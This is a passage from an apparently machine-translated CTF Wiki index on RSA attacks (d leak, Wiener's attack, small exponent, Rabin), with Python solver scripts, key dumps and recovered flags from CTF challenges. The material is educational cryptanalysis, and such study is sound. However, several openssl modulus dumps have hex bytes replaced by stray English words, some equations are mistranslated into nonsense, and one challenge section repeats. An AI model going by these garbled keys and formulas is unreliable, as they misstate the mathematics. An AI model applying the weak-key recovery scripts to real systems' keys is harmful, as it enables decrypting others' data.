404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) Then use RsaConverter and u,t,n to get the corresponding p and q. as follows 94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 Then we go directly to get d, and then we can recover the plaintext. p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 if p * q == n : print 'true' Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df flag = gmpy2 . powmod ( cipher , d , n ) print long_to_bytes ( flag ) Get flag true hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"Private Key d Related Attacks"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#d-leak-attack","text":"","title":"d Leak attack"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#attack-principle","text":"First, when d is leaked, we can naturally decrypt all encrypted messages. We can even decompose the modulus N. The basic principle is as follows We know ed \\equiv 1 \\bmod \\varphi(n) ed \\equiv 1 \\bmod \\varphi(n) , then \\varphi(n) | k=ed-1 \\varphi(n) | k=ed-1 . Obviously k is an even number, we can make k=2^tr k=2^tr , where r is odd and t is not less than 1. So for any number g that is relative to N, we have g^k \\equiv 1 \\bmod n g^k \\equiv 1 \\bmod n . Then z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} is the quadratic root of the modulo N. Then we have $$ z^2 \\equiv 1 \\bmod p \\ z^2 \\equiv 1 \\bmod q $$ Furthermore, we know that the equation has the following four solutions, the first two are $$ x equiv PM1 N way $$ The last two are \\pm x \\pm x , where x satisfies the following conditions $$ x equiv 1 p \\ way x equiv -1 q way $$ Obviously, z=g^{\\frac{k}{2}} z=g^{\\frac{k}{2}} satisfies the latter condition, and we can calculate gcd(z-1,N) gcd(z-1,N) to decompose N.","title":"Attack principle"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#tools","text":"Use the following tools to perform calculations directly RsaConverter.exe ( https://sourceforge.net/projects/rsaconverter/ , for windows ) rsatool.py","title":"Tools"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2017-hitb-hack-in-the-card-ii","text":"The second smart card sent to us has been added some countermeasures by that evil company. They also changed the public key(attachments -> publickey.pem). However it seems that they missed something...... Can you decrypt the following hex-encoded ciphertext this time? ``` > 016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 ``` This question is a question that follows 2017 HITB - hack in the card I. We use openssl to view the public key of publickey.pem and find that its N is the same as the N of the previous question, and the N of the previous question, e,d is known. Thus, you can directly use the above rsatool.py to get p, q, and calculate e from the e of this problem to get the plain text.","title":"2017 HITB - hack in the card II"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#wieners-attack","text":"","title":"Wiener&#39;s Attack"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#attack-conditions","text":"When d is small ( d<\\frac{1}{3}N^{\\frac{1}{4}} d&lt;\\frac{1}{3}N^{\\frac{1}{4}} ), an attacker can use Wiener's Attack to get the private key.","title":"Attack conditions"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#attack-principle_1","text":"https://en.wikipedia.org/wiki/Wiener%27s_attack https://sagi.io/2016/04/crypto-classics-wieners-rsa-attack/","title":"Attack principle"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#tools_1","text":"https://github.com/pablocelayes/rsa-wiener-attack","title":"Tools"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#comprehensive-example","text":"","title":"Comprehensive example"},{"location":"crypto/asymmetric/rsa/rsa_d_attack/#2016-hctf-rsa1","text":"Here we take the RSA 1 - Crypto So Interesting in the 2016 HCTF as an example, [source code link] ( https://github.com/Hcamael/ctf-library/tree/master/RSA1 ). First, bypass the proof part of the program, and you can bypass it with almost random data. Second, let's analyze the specific code part. The program gets the flag according to our token. Here we directly use the token provided in the source code. print \"This is a RSA Decryption System\" print \"Please enter Your team token: \" token = raw_input () try : flag = get_flag ( token ) assert len ( flag ) == 38 except : print \"Token error!\" m_exit ( - 1 ) Next we first know n=pq n=pq , let's take a closer look at how this e, d is obtained. p = getPrime ( 2048 ) q = getPrime ( 2048 ) n = p * q e , d = get_ed ( p , q ) print \"n: \" , hex ( n ) print & quot ; e : & quot ;, hex ( e ) get_ed function is as follows def get_ed ( p , q ): k = cal_bit ( q * p ) phi_n = ( p - 1 ) * ( q - 1 ) r = random . randint ( 10 , 99 ) while True : u = getPrime ( k / 4 - r ) if gcd ( u , phi_n ) != 1 : continue t = invmod ( u , phi_n ) e = pi_b ( t ) if gcd ( e , phi_n ) == 1 : break d = invmod ( e , phi_n ) return ( e , d ) It can be seen that the number of bits we get is less than a quarter of the number of bits in n, which is almost the same as Wiener's Attack. And we calculated u, t, e, d also meet the following conditions $$ \\begin{align*} out & equals 1 bmod varphi (n) Others & equiv 1 bt \\ way ed &\\equiv 1 \\bmod \\varphi(n) \\end{align*} $$ According to the conditions given in the title, we already know n, e, bt. So first we can know e according to the second formula above. At this time, you can use the first formula for Wiener's Attack to get u. Then we can use the private key index to leak the attack to decompose N to get p, q. Then we can get d. First we bypassed proof and got N, e. The encrypted flag is as follows n: 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 is: flag: 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df Secondly, use the following method to get Wiener's Attack to get u, as follows if __name__ == \"__main__\" : bt = e = t = gmpy2 . invert ( e , bt ) n = 0x4b4403cd5ac8bdfaa3bbf83decdc97db1fbc7615fd52f67a8acf7588945cd8c3627211ffd3964d979cb1ab3850348a453153710337c6fe3baa15d986c87fca1c97c6d270335b8a7ecae81ae0ebde48aa957e7102ce3e679423f29775eef5935006e8bc4098a52a168e07b75e431a796e3dcd29c98dab6971d3eac5b5b19fb4d2b32f8702ef97d92da547da2e22387f7555531af4327392ef9c82227c5a2479623dde06b525969e9480a39015a3ed57828162ca67e6d41fb7e79e1b25e56f1cff487c1d0e0363dc105512d75c83ad0085b75ede688611d489c1c2ea003c3b2f81722cdb307a3647f2da01fb3ba0918cc1ab88c67e1b6467775fa412de7be0b44f2e19036471b618db1415f6b656701f692c5e841d2f58da7fd2bc33e7c3c55fcb8fd980c9e459a6df44b0ef70b4b1d813a57530446aa054cbfb9d1a86ffb6074b6b7398a83b5f0543b910dcb9f111096b07a98830a3ce6da47cd36b7c1ac1b2104ea60dc198c34f1c50faa5b697f2f195afe8af5d455e8ac7ca6eda669a5a1e3bfbd290a4480376abd1ff21298d529b26a4e614ab24c776a10f5f5d8e8809467a3e81f04cf5d5b23eb4a3412886797cab4b3c5724c077354b2d11d19ae4e301cd2ca743e56456d2a785b650c7e1a727b1bd881ee85c8d109792393cc1a92a66b0bc23b164146548f4e184b10c80ec458b776df10405b65399e32d657bc83e1451 solve ( n , t ) The solve function is the function of the corresponding Wiener's Attack. We got u as follows \u279c rsa-wiener-attack git: ( master ) \u2717 python RSAwienerHacker.py Testing Wiener Attack Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) ------------------------- Hacked! ( 'hacked_d = ' , mpz ( 404713159471231711408151571380906751680333129144247165378555186876078301457022630947986647887431519481527070603810696638453560506186951324208972060991323925955752760273325044674073649258563488270334557390141102174681693044992933206572452629140703447755138963985034199697200260653L )) Then use RsaConverter and u,t,n to get the corresponding p and q. as follows 94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 Then we go directly to get d, and then we can recover the plaintext. p = 0x94121F49C0E7A37A60FDE4D13F021675ED91032EB16CB070975A3EECECE8697ED161A27D86BCBC4F45AA6CDC128EB878802E0AD3B95B2961138C8CD04D28471B558CD816279BDCCF8FA1513A444AF364D8FDA8176A4E459B1B939EBEC6BB164F06CDDE9C203C612541E79E8B6C266436AB903209F5C63C8F0DA192F129F0272090CBE1A37E2615EF7DFBB05D8D88B9C964D5A42A7E0D6D0FF344303C4364C894AB7D912065ABC30815A3B8E0232D1B3D7F6B80ED7FE4B71C3477E4D6C2C78D733CF23C694C535DB172D2968483E63CC031DFC5B27792E2235C625EC0CFDE33FD3E53915357772975D264D24A7F31308D72E1BD7656B1C16F58372E7682660381 q = 0x8220863F1CFDA6EDE52C56B4036485DB53F57A4629F5727EDC4C5637603FE059EB44751FC49EC846C0B8B50966678DFFB1CFEB350EC44B57586A81D35E4887F1722367CE99116092463079A63E3F29D4F4BC416E7728B26248EE8CD2EFEA6925EC6F455DF966CEE13C808BC15CA2A6AAC7FEA69DB7C9EB9786B50EBD437D38B73D44F3687AEB5DF03B6F425CF3171B098AAC6708D534F4D3A9B3D43BAF70316812EF95FC7EBB7E224A7016D7692B52CB0958951BAB4FB5CB1ABB4DAC606F03FA15697CC3E9DF26DE5F6D6EC45A683CD5AAFD58D416969695067795A2CF7899F61669BC7543151AB700A593BF5A1E5C2AFBCE45A08A2A9CC1685FAF1F96B138D1 if p * q == n : print 'true' Phin = ( p - 1 ) * ( q - 1 ) d = gmpy2 . invert ( e , phin ) cipher = 0x2517d1866acc5b7b802a51d6251673262e9e6b2d0e0e14a87b838c2751dee91e4ea29019b0a7877b849fddf9e08580d810622db538462b529412eba9d0f8a450fe1889021c0bbd12a62ccc3fff4627b1dbdebec3a356a066adc03f7650722a34fe41ea0a247cb480a12286fffc799d66b6631a220b8401f5f50daa12943856b35e59abf8457b2269efea14f1535fb95e56398fd5f3ac153e3ea1afd7b0bb5f02832883da46343404eb44594d04bbd254a9a35749af84eaf4e35ba1c5571d41cab4d58befa79b6745d8ecf93b64dd26056a6d1e82430afbff3dbc08d6c974364b57b30c8a8230c99f0ec3168ac4813c4205d9190481282ae14f7b94400caff3786ed35863b66fefcffbef1ad1652221746a5c8da083987b2b69689cf43e86a05ce4cf059934716c455a6410560e41149fbcf5fcea3c210120f106b8f6269b9a954139350626cf4dcb497ce86264e05565ec6c6581bf28c643bb4fab8677148c8034833cedacb32172b0ff21f363ca07de0fa2882ac896954251277adc0cdd0c3bd5a3f107dbebf5f4d884e43fe9b118bdd51dc80607608670507388ae129a71e0005826c7c82efccf9c86c96777d7d3b9b5cce425e3dcf9aec0643f003c851353e36809b9202ff3b79e8f33d40967c1d36f5d585ac9eba73611152fc6d3cf36fd9a60b4c621858ed1f6d4db86054c27828e22357fa3d7c71559d175ff8e8987df flag = gmpy2 . powmod ( cipher , d , n ) print long_to_bytes ( flag ) Get flag true hctf { d8e8fca2dc0f896fd7cb4cb0031ba249 }","title":"2016 HCTF RSA1"},{"location":"crypto/asymmetric/rsa/rsa_e_attack/","text":"Small public key index attack \u00b6 Attack conditions \u00b6 e is very small, such as e is 3. Attack principle \u00b6 Suppose the user uses the key e=3 e=3 . Considering that the encryption relationship is satisfied: $$ c\\equiv m^3 \\bmod N $$ then: $$ \\begin{align*} m^3 &= c+k\\times N\\ m &= \\sqrt[3]{c+k\\times n} \\end{align*} $$ An attacker can enumerate k k from small to large and open three roots in turn until an integer is opened. Examples \u00b6 Here we take the XMan Summer Camp class exercise as an example (Jarvis OJ has a recurrence), the attachment has a flag.enc and pubkey.pem , which is obviously a ciphertext and a public key. Openssl` Read the public key. \u279c Jarvis OJ-Extremely hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 4096 bit ) Modulus: 00 :b0:be:e5:e3:e9:e5:a7:e8:d0:0b:49:33:55:c6: 18 : fc: 8c: 7d: 7d: 03 : b8: 2e: 40 : 99 : 51 : c1: 82 : f3: 98 : from: e3: 10 : 45 : 80 : e7: no: 70 : d3: 83 : yes: 53 : 11 : 47 : 56 : 56 :e8:a9:64:d3:80:cb:15:7f:48:c9:51:ad:fa:65: db: 0b: 12 : 2c: a4: 0e: 42 : fa: 70 : 91 : 89 : b7: 19 : d7: 46 : E2: F6: 06 : 9b: of: 11 : ce: bd: 65 : 0f: 14 : b9: 3c: 97 : 73 : 52 : fd: 13 : b1: yes: a6: d6: e1: da: 77 : 55 : 02 : ab: ff:89:d3:a8:b3:61:5f:d0:db:49:b8:8a:97:6b:c2: 05 : 68 : 48 : 92 : 84 : e1: 81 : f6, f1: 1E: 27 : 08 : 91 : c8: if : 80 : 01 : 7b: ad: 23 : 8e: 36 : 30 : 39 : a: 10 :1b:c2:99:49:d3:a4:f4:03:8d:46:39:38:85:15: 79 : c7: 52 : 5a: 69 : 98 : 4f: 15 : b5: 66 : 7f: 34 : 20 : eb: 26 : 11 : 36 : 94 : 7f: a1: 23 : e5: 49 : df: ff: 00 : 60 : 18 : 83 : of: D9: 36 : fe: 41 : 1e: 00 : 6e: 4e: 93 : D1: A0: 0b: 0f: ea: 54 : 1b: bf: c8: c5: 18 : 6c: b6: 22 : 05 : 03 : 13 : 11 : 0d: 64 : 0c: 77 : ea: 54 : no: 32 : 20 : fc: 8f: 4c: c6: what: 77 : 15 : 1e: 29 : b3: e0: 65 : 78 : c4: 78 : 45 :89:ef:9a:19:7f:6f:80:6d:b8:b3:ec:d8:26:ca: d2:4f:53:24:cc:de:c6:e8:fe:ad:2c:21:50:06:86: 02 :c8:dc:dc:59:40:2c:ca:c9:42:4b:79:00:48:cc: dd: 93 : 27 : 06 : 80 : 95 : ef: a0: 10 : b7: f1: 96 : c7: 4b: c3: 7b: 12 : 8f: 9e: 14 : 11 : 75 : 16 : 33 : f7: 8b: 7b: 9e: 56 : f7: 1f: 77 : a1: b4: da: ad: 3f: c5: 4b: 5e: 7e: a7:2f:b1:76:75:97:65:52:2b:4b:bc:02:e3:14:d5: c0:6b:64:d5:05:4b:7b:09:6c:60:12:36:e6:cc:f4: 5b:5e:61:1c:80:5d:33:5d:ba:b0:c3:5d:22:6c:c2: 08 : d8: the 47 : 36 : ba: 39 : A0: 35 : 44 : 26 : fa: e0: 06 : 7 : fe: 52 : d5: 26 : 7d: cf: b9: c3: 88 : 4f: 51 : fd: df: df: 4a: 97 : 94 : bc: fe: 0e: 15 : 57 : 11 : 37 : 49 : e6: c8: ef: 42 : 1d: You do not know how to do this. 2d: 34 : 88 : f7: 6d: eb: 62 : bd: ef: 7b: ea: 60 : 26 : f2: 2a: 1d: 25 : aa: 2a: 92 : d1: 17 : 4b: 98 : 03 : e6: bb: 5f: ad: 75 : e1: 86 : a9: 46 : a1: 0f: 12 : 43 : f4: 38 : 74 : 46 : cc: this: b2: 22 : 2a: 96 : 5c: c3: 0b:39:29 Exponent: 3 ( 0x3 ) Modulus = B0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929 writing RSA key -----BEGIN PUBLIC KEY----- MIICIDANBgkqhkiG9w0BAQEFAAOCAg0AMIICCAKCAgEAsL7l4 + nlp + jQC0kzVcYY /Ix9fQO4LkCZUcGC85je4xBFgOe6cNODrlMRR1ZW6Klk04DLFX9IyVGt+mXbCxIs pA5C+nCRibcZpPDXRuL2BpuvEc69ZQ8UuTyXc1L9E7Huptbh2ndVAqv/idOos2Ff 0NtJuIqXa8IFaEiShOGB9vEeJwiRyO+AAXutI442MDmkWEcPF0kQG8KZSdOk9AON Rjk4hRV5x1JaaZhPFbVmfzQgm3DrJhE2lH + hI + VJ3 / 8AYBiDr9k2 / kEeAG5Ok9Gg Cw/qVBu/yMUYbLYiBQOpSyQTEQ1kDHfqVLoyIPyPTMbOdxUeKbPgZXjEeL0b6+BF ie+aGX9vgG24s+zYJsrST1MkzN7G6P6tLCFQBoYCyNzcWUAsyslCS3kASMzdkycG gJXvoBC38ZbHS6jDexKPnhQRdRYz94t7nlb3H3ehtNqtP8VLXn75NdmnL7F2dZdl UitLvALjFNXAa2TVBUt7CWxgEjbmzPRbXmEcgF0zXbqww10ibMII2M5HNro5oDVE JvrgBsf+UtUmfc+5w4hPUf3f30qXlLz+DhVXETdJ5sjvQh26Jjr/aHOc4A7YD9AC LvktNIj3betive976mAm8iodJaoqktEkQUqAIf4MF0uYA+a7X6114YapRqFygHcP EkP0OHRGzM6yIiqWXMMLOSkCAQM = -----END PUBLIC KEY----- Seeing e=3 e=3 , it is clear that the small public key index attacked. Here we use the Crypto library to read the public key and use multiprocessing to speed up the crack. #/usr/bin/python # coding=utf-8 import gmpy2 from Crypto.PublicKey import RSA from multiprocessing import Pool pool = Pool ( 4 ) with open ( './pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : cipher = f . read () . encode ( 'hex' ) cipher = int ( cipher , 16 ) def calc ( j ): print j a , b = gmpy2 . iroot ( cipher + j * N , 3 ) if b == 1 : m = a print ' {:x} ' . format ( int ( m )) . decode ( 'hex' ) pool . terminate () exit () def SmallE (): inputs = range ( 0 , 130000000 ) pool . map ( calc , inputs ) pool . close () pool . join () if __name__ == '__main__' : print 'start' SmallE () The blasting time is a bit long, get the flag Didn't you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: flag{Sm4ll_3xpon3nt_i5_W3ak} Title \u00b6 RSA Derivative Algorithm - Rabin Algorithm \u00b6 Attack conditions \u00b6 The Rabin algorithm is characterized by e=2 e=2 . Attack principle \u00b6 Ciphertext: $$ c = m ^ 2 n way $$ Decryption: Calculate m_p m_p and m_q m_q : $$ \\begin{align*} m_p & = sqrt {c} p \\ way m_q & = sqrt {c} q way \\end{align*} $$ Calculate y_p y_p and y_q y_q with extended Euclidean: $$ y_p \\cdot p + y_q \\cdot q = 1 $$ Solve four plaintexts: $$ \\begin{align*} a &= (y_p \\cdot p \\cdot m_q + y_q \\cdot q \\cdot m_p) \\bmod n\\ b &= n - a\\ c &= (y_p \\cdot p \\cdot m_q - y_q \\cdot q \\cdot m_p) \\bmod n\\ d &= n - c \\end{align*} $$ Note: If p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 , then $$ \\begin{align*} m_p & c = ^ { frac {1} {4} (p + 1)} p \\ way m_q & c = ^ { frac {1} {4} (q + 1)} q way \\end{align*} $$ In general, p \\equiv q \\equiv 3 \\pmod 4 p \\equiv q \\equiv 3 \\pmod 4 is satisfied. For cases that are not met, please refer to the corresponding algorithm. Examples \u00b6 Here we take the XMan Summer Camp class exercise (Jarvis OJ has a recurrence) as an example, read the public key. \u279c Jarvis OJ-hard RSA git: ( master ) \u2717 openssl rsa -pubin -in pubkey.pem -text -modulus Public-Key: ( 256 bit ) Modulus: 00 : c2: 63 : 6a: e5: c3: d8: e4: 3f: fb: 97 : ab: 1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f: be:30:dd Exponent: 2 ( 0x2 ) Modulus = C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD writing RSA key -----BEGIN PUBLIC KEY----- MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ / + 5erCQKPGqxsC / bNPXDr yigb / + l / vjDdAgEC -----END PUBLIC KEY----- e=2 e=2 , consider the Rabin algorithm. First, let's break down p and q first. p=275127860351348928173285174381581152299 q=319576316814478949870590164193048041239 Write code #!/usr/bin/python # coding=utf-8 import gmpy2 import string from Crypto.PublicKey import RSA # Read public key parameters with open ( 'pubkey.pem' , 'r' ) as f : key = RSA . importKey ( f ) N = key . n e = key . e with open ( 'flag.enc' , 'r' ) as f : 